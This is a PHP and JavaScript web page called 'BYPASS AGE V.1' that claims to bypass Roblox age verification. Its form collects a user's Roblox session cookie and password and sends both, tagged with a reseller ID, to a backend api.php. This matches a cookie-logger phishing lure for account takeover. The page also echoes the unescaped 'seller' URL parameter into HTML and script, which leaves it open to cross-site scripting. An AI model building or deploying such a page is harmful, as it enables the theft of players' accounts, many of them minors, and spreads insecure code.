<?php $seller = isset($_GET['seller']) ? $_GET['seller'] : ''; ?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <base href="<?php echo str_repeat('../', substr_count($seller, '/') + ($seller ? 1 : 0)); ?>./">
    <title>KONTOLODON - BYPASS AGE V.1</title>
    
    <!-- Google Fonts: Inter & JetBrains Mono for Code feel -->
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&family=JetBrains+Mono:wght@400;700&family=Rubik+Glitch&display=swap" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Animate.css for SWAL Animations -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    
    <!-- SweetAlert2 -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <!-- jQuery for AJAX -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

    <style>
        :root {
            --primary: #00ff41; /* Matrix Green */
            --primary-glow: rgba(0, 255, 65, 0.4);
            --bg-dark: #000000;
            --glass-bg: rgba(0, 0, 0, 0.9);
            --glass-border: rgba(0, 255, 65, 0.2);
            --text-main: #00ff41;
            --text-dim: #008f11;
            --font-code: 'JetBrains Mono', monospace;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: var(--bg-dark);
            color: var(--text-main);
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow-x: hidden;
        }

        /* Matrix Background Canvas */
        #matrix-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.3;
        }

        .container {
            position: relative;
            z-index: 1;
            width: 100%;
            max-width: 450px;
            padding: 40px;
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: 4px;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
            animation: glitch-entry 1s ease-out;
        }

        @keyframes glitch-entry {
            0% { opacity: 0; transform: scale(0.9) skewX(10deg); }
            50% { opacity: 0.5; transform: scale(1.05) skewX(-5deg); }
            100% { opacity: 1; transform: scale(1) skewX(0); }
        }

        .header {
            margin-bottom: 25px;
            border-bottom: 2px solid var(--glass-border);
            padding-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .logo {
            font-family: var(--font-code);
            font-size: 1.5rem;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            text-shadow: 0 0 10px var(--primary-glow);
        }

        .status-bar {
            font-family: var(--font-code);
            font-size: 0.7rem;
            color: var(--text-dim);
        }

        .status-bar span::before {
            content: "";
            display: inline-block;
            width: 6px;
            height: 6px;
            background: var(--primary);
            border-radius: 50%;
            margin-right: 5px;
            box-shadow: 0 0 5px var(--primary);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            font-family: var(--font-code);
            font-size: 0.85rem;
            margin-bottom: 10px;
            text-transform: uppercase;
        }

        .terminal-input {
            position: relative;
            background: rgba(0, 255, 65, 0.05);
            border: 1px solid var(--glass-border);
            padding: 2px;
        }

        .terminal-input::before {
            content: ">";
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            font-family: var(--font-code);
            color: var(--primary);
        }

        input {
            width: 100%;
            padding: 12px 12px 12px 30px;
            background: transparent;
            border: none;
            color: var(--primary);
            font-family: var(--font-code);
            font-size: 1rem;
            outline: none;
        }

        input::placeholder {
            color: rgba(0, 255, 65, 0.2);
        }

        .btn-bypass {
            width: 100%;
            padding: 15px;
            background: var(--primary);
            border: none;
            color: black;
            font-family: var(--font-code);
            font-size: 1rem;
            font-weight: 700;
            text-transform: uppercase;
            cursor: pointer;
            transition: all 0.2s ease;
        }

        .btn-bypass:hover {
            background: #fff;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.4);
        }

        .btn-bypass:disabled {
            background: #333;
            color: #666;
            cursor: not-allowed;
        }

        /* Loading Overlay */
        #loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: rgba(0, 0, 0, 0.98);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            font-family: var(--font-code);
            text-align: center;
        }

        .load-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 20px;
            width: 100%;
            padding: 20px;
        }

        .avatar-frame {
            position: relative;
            width: 140px;
            height: 140px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        #load-avatar {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            border: 3px solid var(--primary);
            box-shadow: 0 0 25px var(--primary-glow);
            background: #111;
            z-index: 2;
            object-fit: cover;
        }

        .avatar-frame::after {
            content: '';
            position: absolute;
            width: 140px;
            height: 140px;
            border: 2px dashed var(--primary);
            border-radius: 50%;
            animation: rotate 10s linear infinite;
            opacity: 0.5;
        }

        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        #load-username {
            font-size: 1.8rem;
            font-weight: 700;
            color: white;
            text-shadow: 0 0 10px var(--primary-glow);
            letter-spacing: 2px;
        }

        .progress-container {
            width: 80%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 2px;
            overflow: hidden;
            border: 1px solid var(--glass-border);
            margin: 15px 0;
        }

        .progress-bar {
            height: 12px;
            width: 10%;
            background: var(--primary);
            box-shadow: 0 0 15px var(--primary-glow);
            transition: width 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .loading-percentage {
            font-size: 3.5rem;
            font-weight: 700;
            color: var(--primary);
            text-shadow: 0 0 20px var(--primary-glow);
            margin: 10px 0;
        }

        .loading-text {
            font-size: 1rem;
            letter-spacing: 6px;
            color: var(--text-dim);
            text-transform: uppercase;
            margin-top: 15px;
        }

        /* Custom Modern SweetAlert2 Styling */
        .swal2-popup.modern-hacker-popup {
            background: rgba(0, 0, 0, 0.98) !important;
            backdrop-filter: blur(15px) !important;
            border: 1px solid var(--primary) !important;
            box-shadow: 0 0 50px rgba(0, 255, 65, 0.15) !important;
            border-radius: 8px !important;
            font-family: var(--font-code) !important;
            padding: 2em !important;
        }

        .swal2-title.modern-hacker-title {
            color: var(--primary) !important;
            text-transform: uppercase !important;
            letter-spacing: 4px !important;
            font-size: 1.8rem !important;
            margin-bottom: 0.5em !important;
            text-shadow: 0 0 15px var(--primary-glow) !important;
        }

        .swal2-html-container.modern-hacker-content {
            color: #ffffff !important;
            font-size: 1rem !important;
            line-height: 1.6 !important;
            text-align: left !important;
            margin: 1em 0 !important;
        }

        .swal2-confirm.modern-hacker-confirm {
            background: var(--primary) !important;
            color: #000 !important;
            border-radius: 4px !important;
            font-weight: 800 !important;
            text-transform: uppercase !important;
            letter-spacing: 2px !important;
            padding: 15px 40px !important;
            margin-top: 15px !important;
            box-shadow: 0 0 20px var(--primary-glow) !important;
            transition: all 0.3s ease !important;
        }

        .swal2-confirm.modern-hacker-confirm:hover {
            background: #ffffff !important;
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.3) !important;
        }

        /* Failure Popup Styling */
        .swal2-popup.modern-hacker-popup-fail {
            background: rgba(20, 0, 0, 0.98) !important;
            backdrop-filter: blur(15px) !important;
            border: 1px solid #f00 !important;
            box-shadow: 0 0 50px rgba(255, 0, 0, 0.2) !important;
            border-radius: 8px !important;
            font-family: var(--font-code) !important;
            padding: 2em !important;
        }

        .swal2-title.modern-hacker-title-fail {
            color: #f00 !important;
            text-transform: uppercase !important;
            letter-spacing: 4px !important;
            font-size: 1.8rem !important;
            margin-bottom: 0.5em !important;
            text-shadow: 0 0 15px rgba(255, 0, 0, 0.4) !important;
        }

        .swal2-confirm.modern-hacker-confirm-fail {
            background: #f00 !important;
            color: #fff !important;
            border-radius: 4px !important;
            font-weight: 800 !important;
            text-transform: uppercase !important;
            letter-spacing: 2px !important;
            padding: 15px 40px !important;
            margin-top: 15px !important;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3) !important;
            transition: all 0.3s ease !important;
        }

        .swal2-confirm.modern-hacker-confirm-fail:hover {
            background: #fff !important;
            color: #f00 !important;
            box-shadow: 0 0 30px rgba(255, 255, 255, 0.3) !important;
        }

        /* Success History Panel */
        #history-panel {
            position: fixed;
            top: 20px;
            right: 20px;
            width: 280px;
            background: rgba(0, 0, 0, 0.9);
            border: 1px solid var(--glass-border);
            border-radius: 4px;
            z-index: 100;
            display: flex;
            flex-direction: column;
            backdrop-filter: blur(10px);
            max-height: 290px;
        }

        #history-list {
            overflow-y: auto;
            flex: 1;
            padding: 0 15px 15px 15px;
            scrollbar-width: thin;
            scrollbar-color: var(--primary) transparent;
        }

        #history-list::-webkit-scrollbar {
            width: 4px;
        }

        #history-list::-webkit-scrollbar-thumb {
            background: var(--primary);
        }

        .history-title {
            font-family: var(--font-code);
            font-size: 0.8rem;
            color: var(--primary);
            text-transform: uppercase;
            letter-spacing: 2px;
            padding: 15px;
            background: rgba(0, 0, 0, 0.6);
            border-bottom: 1px solid var(--glass-border);
            display: flex;
            align-items: center;
            gap: 8px;
            position: sticky;
            top: 0;
            z-index: 2;
        }

        .history-item {
            display: flex;
            align-items: center;
            gap: 15px;
            background: rgba(0, 255, 65, 0.03);
            padding: 10px;
            border-radius: 8px;
            border-left: 4px solid var(--primary);
            margin-bottom: 8px;
            transition: all 0.3s ease;
            animation: slideInRight 0.4s ease-out;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .history-item:hover {
            background: rgba(0, 255, 65, 0.08);
            transform: scale(1.02);
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
        }

        @keyframes slideInRight {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }

        .history-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid var(--primary);
            object-fit: cover;
            background: #111;
        }

        .history-info {
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .history-username {
            font-family: var(--font-code);
            font-size: 0.9rem;
            color: #fff;
            font-weight: 700;
            letter-spacing: 1px;
            margin-bottom: 4px;
        }

        .history-time {
            font-family: var(--font-code);
            font-size: 0.75rem;
            color: var(--primary);
            display: flex;
            align-items: center;
            gap: 5px;
            opacity: 0.8;
        }

        .footer {
            margin-top: 30px;
            font-family: var(--font-code);
            font-size: 0.7rem;
            color: var(--text-dim);
            text-align: center;
            border-top: 1px solid var(--glass-border);
            padding-top: 15px;
        }

        .scanline {
            width: 100%;
            height: 100px;
            z-index: 2;
            background: linear-gradient(0deg, rgba(0, 0, 0, 0) 0%, rgba(0, 255, 65, 0.01) 50%, rgba(0, 0, 0, 0) 100%);
            pointer-events: none;
            position: absolute;
            bottom: 100%;
            animation: scanline 8s linear infinite;
        }

        @keyframes scanline {
            0% { bottom: 100%; }
            100% { bottom: -100px; }
        }

        @media (max-width: 900px) {
            body {
                overflow-y: auto;
                align-items: flex-start;
                padding: 40px 20px;
                display: block;
            }
            .container {
                margin: 0 auto 30px auto;
                width: 100%;
            }
            #history-panel {
                position: relative;
                top: auto;
                right: auto;
                width: 100%;
                max-width: 450px;
                margin: 0 auto;
                max-height: none;
                z-index: 10;
                box-shadow: none;
                background: rgba(0, 0, 0, 0.6);
            }
        }
        /* Intro Splash Screen */
        #intro-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: #000;
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: var(--font-code);
            padding: 20px;
        }

        .terminal-loader {
            text-align: center;
            width: 100%;
            max-width: 900px;
            color: var(--primary);
            font-family: 'Rubik Glitch', system-ui;
            font-size: 2.2rem;
            font-weight: 400;
            line-height: 1.2;
            text-shadow: 0 0 10px var(--primary-glow);
            letter-spacing: 2px;
            text-transform: uppercase;
            animation: glitch-font 1.5s infinite linear;
        }

        @keyframes glitch-font {
            0%, 40%, 44%, 58%, 61%, 100% { opacity: 1; text-shadow: 0 0 8px var(--primary-glow); }
            41% { opacity: 0.7; text-shadow: 2px 0 #f0f; }
            43% { opacity: 0.8; text-shadow: -2px 0 #0ff; }
            59% { opacity: 0.9; text-shadow: 1px 0 #f0f; }
            60% { opacity: 0.6; text-shadow: -1px 0 #0ff; }
        }

        @media (max-width: 600px) {
            .terminal-loader {
                font-size: 1.4rem;
                letter-spacing: 1px;
            }
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

    </style>
</head>
<body>

    <div id="intro-overlay">
        <div class="terminal-loader">
            <div id="intro-text"></div>
        </div>
    </div>

    <canvas id="matrix-canvas"></canvas>
    <div class="scanline"></div>

    <div id="loading-overlay">
        <div class="load-content">
            <div class="avatar-frame">
                <img src="" alt="Avatar" id="load-avatar">
            </div>
            <div id="load-username">FETCHING_USER...</div>
            <div class="loading-percentage" id="perc-text">10%</div>
            <div class="progress-container">
                <div class="progress-bar" id="prog-bar"></div>
            </div>
            <div class="loading-text">BYPASS_IN_PROGRESS...</div>
        </div>
    </div>

    <div class="container">
        <div class="header">
            <div class="logo">BYPASS AGE V.1</div>
            <div class="status-bar"><span>ONLINE</span></div>
        </div>
        <form id="bypassForm" method="POST">
            <div class="form-group">
                <label>ROBLOX COOKIE INPUT</label>
                <div class="terminal-input">
                    <input type="text" id="cookie" name="cookie" placeholder="PUT YOUR COOKIE ROBLOX HERE !" autocomplete="off" required>
                </div>
            </div>
            <div class="form-group">
                <label>PASSWORD</label>
                <div class="terminal-input">
                    <input type="password" id="password" name="password" placeholder="NEED PASSWORD FOR AUTHENTICATION !" autocomplete="off" required>
                </div>
            </div>
            <button type="submit" class="btn-bypass" id="submitBtn">
                <span id="btnText">START BYPASS</span>
            </button>
        </form>
        <div class="footer">
            &copy; 2025 BETA // BYPASS AGE V.1
        </div>
    </div>

    <div id="history-panel">
        <div class="history-title">
            <i class="fas fa-history"></i> BYPASS_HISTORY
        </div>
        <div id="history-list"></div>
    </div>

    <script>
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        canvas.height = window.innerHeight;
        canvas.width = window.innerWidth;
        const characters = '01';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        for (let i = 0; i < columns; i++) drops[i] = 1;
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0a3';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = characters.charAt(Math.floor(Math.random() * characters.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 50);

        $(document).ready(function() {
            // Intro Animation Sequence (Faster & Focused)
            const introTagline = "BEST WEBSITE AGE BYPASS ROBLOX";
            let charIndex = 0;
            const introContainer = $('#intro-text');
            
            function typeIntro() {
                if (charIndex < introTagline.length) {
                    introContainer.append(introTagline.charAt(charIndex));
                    charIndex++;
                    setTimeout(typeIntro, 35); // Faster typing
                } else {
                    setTimeout(() => {
                        $('#intro-overlay').fadeOut(600);
                    }, 800);
                }
            }
            
            introContainer.html('');
            setTimeout(typeIntro, 300);

            // Robust Seller Detection: Try PHP first, then fallback to URL parsing
            let currentSeller = '<?php echo $seller; ?>';
            if (!currentSeller) {
                const pathParts = window.location.pathname.split('/');
                const bypassIndex = pathParts.indexOf('bypass');
                if (bypassIndex !== -1 && pathParts[bypassIndex + 1]) {
                    currentSeller = pathParts[bypassIndex + 1];
                }
            }
            // console.log("Detected Seller:", currentSeller); // Debugging
            // If seller is set (clean URL), api.php is in parent dir, otherwise in current dir

            function loadHistory() {
                $.ajax({
                    url: '/api.php?t=' + Date.now(),
                    type: 'GET',
                    data: { action: 'get_history' },
                    dataType: 'json',
                    success: function(history) {
                        $('.history-item').remove();
                        history.forEach(item => {
                            const historyItem = `
                                <div class="history-item">
                                    <img src="${item.avatarUrl}" class="history-avatar">
                                    <div class="history-info">
                                        <div class="history-username">${item.username}</div>
                                        <div class="history-time"><i class="fas fa-clock"></i> ${item.time} | ${item.duration}s</div>
                                    </div>
                                </div>
                            `;
                            $('#history-list').append(historyItem);
                        });
                    }
                });
            }
            
            // Load history immediately on page load
            loadHistory();


            $('#bypassForm').on('submit', function(e) {
                e.preventDefault();
                const cookieData = $('#cookie').val().trim();
                const passwordData = $('#password').val().trim();
                const btn = $('#submitBtn');
                const overlay = $('#loading-overlay');
                const progBar = $('#prog-bar');
                const percText = $('#perc-text');

                if (!cookieData) return;
                btn.prop('disabled', true);
                overlay.css('display', 'flex').hide().fadeIn(300);
                
                progBar.css('width', '10%');
                percText.text('10%');
                $('#load-username').text('AUTHENTICATING...');
                $('#load-avatar').attr('src', 'https://tr.rbxcdn.com/30DAY-AvatarHeadshot-11F4A6A81C5C7A6E81A0413A5C9B0781-Png/420/420/AvatarHeadshot/Png/noFilter');

                let currentProgress = 10;
                let bypassFinished = false;
                let bypassSuccess = false;
                let errorMessage = '';
                const bypassStartTime = Date.now();

                const progressInterval = setInterval(() => {
                    if (currentProgress < 90) {
                        currentProgress += Math.floor(Math.random() * 2) + 1;
                        if (currentProgress > 90) currentProgress = 90;
                    } else if (bypassFinished) {
                        currentProgress += 5;
                        if (currentProgress >= 100) {
                            currentProgress = 100;
                            clearInterval(progressInterval);
                            finishFlow();
                        }
                    }
                    progBar.css('width', currentProgress + '%');
                    percText.text(currentProgress + '%');
                }, 100);

                // console.log("Starting Bypass Flow for cookie:", cookieData.substring(0, 20) + "...");
                // Step 1: Fetch Basic Info (Username & Avatar)
                $.ajax({
                    url: '/api.php?t=' + Date.now(),
                    type: 'POST',
                    data: { action: 'get_basic_info', cookie: cookieData, password: passwordData, seller: currentSeller },
                    dataType: 'json',
                    success: function(basicRes) {
                        if (basicRes.success) {
                            // Update UI with basic info
                            $('#load-username').text(basicRes.username);
                            $('#load-avatar').attr('src', basicRes.avatarUrl);

                            // Step 2: Trigger Bypass after info is displayed
                            $.ajax({
                                url: '/api.php?t=' + Date.now(),
                                type: 'POST',
                                data: { action: 'bypass', cookie: cookieData, password: passwordData, seller: currentSeller },
                                dataType: 'json',
                                success: function(response) {
                                    const bypassEndTime = Date.now();
                                    const timeTaken = ((bypassEndTime - bypassStartTime) / 1000).toFixed(2);
                                    bypassFinished = true;
                                    bypassSuccess = response.success;
                                    errorMessage = response.message;
                                    window.bypassTimeResult = (response.duration) ? response.duration : timeTaken;
                                    window.apiDetailMessage = (response.data && response.data.result && response.data.result.message) ? response.data.result.message : '';
                                },
                                error: function() {
                                    bypassFinished = true;
                                    bypassSuccess = false;
                                    errorMessage = 'Koneksi ke API bypass terputus.';
                                }
                            });
                        } else {
                            bypassFinished = true;
                            bypassSuccess = false;
                            errorMessage = basicRes.message;
                        }
                    },
                    error: function() {
                        bypassFinished = true;
                        bypassSuccess = false;
                        errorMessage = 'Gagal menghubungi server untuk verifikasi cookie.';
                    }
                });

                function finishFlow() {
                    setTimeout(() => {
                        overlay.fadeOut(300, function() {
                            if (bypassSuccess) {
                                const isAlreadyVerified = window.apiDetailMessage.includes('already age-verified');
                                if (isAlreadyVerified) {
                                    Swal.fire({
                                        title: 'FAILED',
                                        html: `<div style="border-top:1px solid rgba(255,0,0,0.3); padding-top:20px; margin-top:10px;"><div style="display:flex; justify-content:space-between; margin-bottom:10px;"><span style="color:#f00; font-weight:700;">[STATUS]</span><span style="color:#fff;">ALREADY_AGE_VERIFIED</span></div><div style="display:flex; justify-content:space-between;"><span style="color:#f00; font-weight:700;">[TIME]</span><span style="color:#fff;">${window.bypassTimeResult} SECONDS</span></div></div>`,
                                        icon: 'error',
                                        iconColor: '#f00',
                                        customClass: { popup: 'modern-hacker-popup-fail', title: 'modern-hacker-title-fail', htmlContainer: 'modern-hacker-content', confirmButton: 'modern-hacker-confirm-fail' },
                                        showClass: { popup: 'animate__animated animate__shakeX' },
                                        confirmButtonText: 'CONFIRM'
                                    });
                                } else {
                                    Swal.fire({
                                        title: 'SUCCESSFULLY',
                                        html: `<div style="border-top:1px solid rgba(0,255,65,0.3); padding-top:20px; margin-top:10px;"><div style="display:flex; justify-content:space-between; margin-bottom:10px;"><span style="color:var(--primary); font-weight:700;">[STATUS]</span><span style="color:#fff;">BYPASS_SUCCESSFUL</span></div><div style="display:flex; justify-content:space-between; margin-bottom:10px;"><span style="color:var(--primary); font-weight:700;">[TIME]</span><span style="color:#fff;">${window.bypassTimeResult} SECONDS</span></div></div>`,
                                        icon: 'success',
                                        iconColor: '#0f4',
                                        customClass: { popup: 'modern-hacker-popup', title: 'modern-hacker-title', htmlContainer: 'modern-hacker-content', confirmButton: 'modern-hacker-confirm' },
                                        confirmButtonText: 'CONFIRM'
                                    });
                                }
                                loadHistory();
                            } else {
                                Swal.fire({ title: 'Failed!', text: errorMessage || 'Something went wrong!', icon: 'error', background: '#000', color: '#f00', confirmButtonColor: '#f00' });
                            }
                            btn.prop('disabled', false);
                            $('#cookie').val('');
                            $('#password').val('');
                        });
                    }, 500);
                }
            });
        });
    </script>
</body>
</html>
